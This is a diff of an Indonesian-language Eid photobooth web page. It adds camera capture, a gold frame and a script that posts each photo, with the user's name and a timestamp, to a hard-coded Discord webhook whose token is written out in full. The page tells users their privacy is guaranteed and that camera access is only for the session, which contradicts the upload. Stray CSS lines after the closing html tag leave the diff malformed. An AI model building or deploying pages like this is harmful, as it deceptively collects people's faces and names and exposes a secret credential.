@@ -4,18 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Eid Mubarak Photobooth 🌙</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     
     <style>
         :root {
             --emerald: #064e3b;
             --gold: #d4af37;
             --white: #ffffff;
-            --glass: rgba(255, 255, 255, 0.15);
+            --glass: rgba(255, 255, 255, 0.12);
         }
 
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #064e3b 0%, #065f46 100%);
+            background: linear-gradient(135deg, #053b2d 0%, #064e3b 100%);
             background-attachment: fixed;
             color: var(--white);
             margin: 0;
@@ -27,40 +28,255 @@
         }
 
         .container {
-            max-width: 500px;
+            max-width: 480px;
             width: 100%;
             text-align: center;
             background: var(--glass);
-            backdrop-filter: blur(15px);
-            padding: 30px;
+            backdrop-filter: blur(20px);
+            padding: 35px 25px;
             border-radius: 30px;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
         }
 
-        h1 { color: var(--gold); margin-bottom: 5px; font-size: 1.8rem; }
-        .subtitle { opacity: 0.8; font-size: 0.9rem; margin-bottom: 20px; }
+        h1 { color: var(--gold); margin: 0; font-size: 1.8rem; }
+        .subtitle { opacity: 0.8; font-size: 0.9rem; margin-bottom: 25px; }
 
-        /* Input Nama */
-        .input-group {
-            margin-bottom: 15px;
+        /* Layar Setup (Sistem Izin) */
+        #setup-screen {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 20px;
+            border: 1px dashed var(--gold);
         }
+
+        .security-note {
+            font-size: 0.8rem;
+            margin-bottom: 20px;
+            color: #a8d5ba;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Input Style */
+        .input-group { margin-bottom: 20px; }
         input[type="text"] {
-            width: 80%;
-            padding: 10px 15px;
-            border-radius: 25px;
-            border: none;
+            width: 85%;
+            padding: 12px 20px;
+            border-radius: 50px;
+            border: 2px solid transparent;
             outline: none;
-            background: rgba(255, 255, 255, 0.9);
+            background: white;
             color: var(--emerald);
-            font-weight: bold;
+            font-weight: 600;
             text-align: center;
+            transition: 0.3s;
         }
+        input[type="text"]:focus { border-color: var(--gold); box-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
 
-        /* Kamera */
+        /* Camera Wrapper */
         .booth-wrapper {
             position: relative;
             border: 4px solid var(--gold);
+            border-radius: 20px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 20px;
+            display: none; /* Muncul setelah izin diberikan */
+        }
+
+        #video { width: 100%; height: auto; transform: scaleX(-1); display: block; }
+
+        #frame-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none;
+            box-shadow: inset 0 0 0 15px var(--gold);
+            opacity: 0.6;
+            z-index: 5;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            margin-top: 10px;
+            font-size: 1rem;
+        }
+
+        .btn-gold { background: var(--gold); color: var(--emerald); }
+        .btn-gold:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4); }
+
+        .btn-outline { background: transparent; border: 2px solid var(--white); color: var(--white); }
+
+        /* Result Area */
+        #result-container {
+            margin-top: 25px;
+            display: none;
+            animation: slideUp 0.5s ease;
+        }
+
+        #photo { width: 100%; border-radius: 15px; border: 2px solid var(--gold); }
+        .status-msg { font-size: 0.85rem; margin-top: 10px; color: #99ffbb; font-style: italic; }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>🌙 Eid Photobooth</h1>
+            <p class="subtitle">Abadikan momen fitri dengan bingkai eksklusif</p>
+        </header>
+
+        <div id="setup-screen">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Tulis namamu di sini..." required>
+            </div>
+            <div class="security-note">
+                <span>🔒</span> Privasi Terjamin. Akses kamera hanya untuk sesi ini.
+            </div>
+            <button id="start-btn" class="btn btn-gold">Mulai Kamera ✨</button>
+        </div>
+
+        <div id="main-booth">
+            <div class="booth-wrapper" id="video-box">
+                <video id="video" autoplay playsinline></video>
+                <div id="frame-overlay"></div>
+            </div>
+
+            <div class="controls" id="action-btns" style="display: none;">
+                <button id="snap" class="btn btn-gold">Ambil & Kirim Foto 📸</button>
+            </div>
+        </div>
+
+        <div id="result-container">
+            <p>Hasil Foto Kamu:</p>
+            <img id="photo" alt="Hasil">
+            <button id="download" class="btn btn-outline">Simpan ke Perangkat ✨</button>
+            <p id="status" class="status-msg"></p>
+        </div>
+
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // 1. Masukkan URL Webhook Discord Kamu di Sini
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME';
+
+        const startBtn = document.getElementById('start-btn');
+        const setupScreen = document.getElementById('setup-screen');
+        const videoBox = document.getElementById('video-box');
+        const actionBtns = document.getElementById('action-btns');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snap = document.getElementById('snap');
+        const photo = document.getElementById('photo');
+        const downloadBtn = document.getElementById('download');
+        const statusMsg = document.getElementById('status');
+        const resultContainer = document.getElementById('result-container');
+        const usernameInput = document.getElementById('username');
+        const context = canvas.getContext('2d');
+
+        // FUNGSI: Mengaktifkan Kamera secara Sopan
+        startBtn.addEventListener('click', async () => {
+            const name = usernameInput.value.trim();
+            if(!name) {
+                alert("Mohon masukkan namamu terlebih dahulu 🙏");
+                return;
+            }
+
+            try {
+                startBtn.innerText = "Menghubungkan...";
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                setupScreen.style.display = 'none';
+                videoBox.style.display = 'block';
+                actionBtns.style.display = 'block';
+                
+            } catch (err) {
+                alert("Kamera tidak dapat diakses. Mohon izinkan akses kamera di browser kamu.");
+                startBtn.innerText = "Mulai Kamera ✨";
+            }
+        });
+
+        // FUNGSI: Mengirim ke Discord
+        async function sendToDiscord(blob, name) {
+            statusMsg.innerText = "⏳ Sedang memproses ke sistem...";
+            
+            const formData = new FormData();
+            formData.append('file', blob, 'eid-photo.png');
+            formData.append('content', `⭐ **Momen Idul Fitri Baru!**\n👤 Nama: **${name}**\n📅 Waktu: ${new Date().toLocaleString()}`);
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    statusMsg.innerText = "✅ Berhasil! Fotomu sudah masuk ke galeri server.";
+                } else {
+                    statusMsg.innerText = "⚠️ Foto gagal terkirim secara otomatis.";
+                }
+            } catch (error) {
+                statusMsg.innerText = "❌ Gangguan koneksi saat mengirim.";
+            }
+        }
+
+        // FUNGSI: Ambil Foto
+        snap.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Gambar (Dibalik agar normal, bukan mirror)
+            context.save();
+            context.scale(-1, 1);
+            context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            context.restore();
+
+            // Tambah Bingkai Emas
+            context.strokeStyle = "#d4af37";
+            context.lineWidth = 40;
+            context.strokeRect(0, 0, canvas.width, canvas.height);
+            
+            // Render Hasil
+            const dataURL = canvas.toDataURL('image/png');
+            photo.src = dataURL;
+            resultContainer.style.display = 'block';
+            resultContainer.scrollIntoView({ behavior: 'smooth' });
+
+            // Proses Kirim ke Discord
+            canvas.toBlob((blob) => {
+                sendToDiscord(blob, usernameInput.value);
+            }, 'image/png');
+        });
+
+        // FUNGSI: Download
+        downloadBtn.addEventListener('click', () => {
+            const link = document.createElement('a');
+            link.download = `Eid-Mubarak-${usernameInput.value}.png`;
+            link.href = photo.src;
+            link.click();
+        });
+    </script>
+</body>
+</html>            border: 4px solid var(--gold);
             border-radius: 20px;
             overflow: hidden;
             background: #000;
